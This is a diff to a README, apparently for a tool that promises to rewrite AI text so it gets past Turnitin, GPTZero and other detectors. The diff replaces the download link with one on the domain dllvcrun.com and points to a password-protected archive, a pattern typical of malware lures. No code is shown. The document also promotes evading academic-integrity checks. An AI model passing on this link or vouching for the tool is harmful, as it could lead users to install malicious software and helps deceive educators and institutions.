@@ -18,7 +18,7 @@ Rewrites AI text to pass Turnitin, GPTZero, Originality.ai, and Copyleaks at 95%
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/aidetbyp2)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/aidetbyp2)
 
 > The archive password is shown on the download page.
 
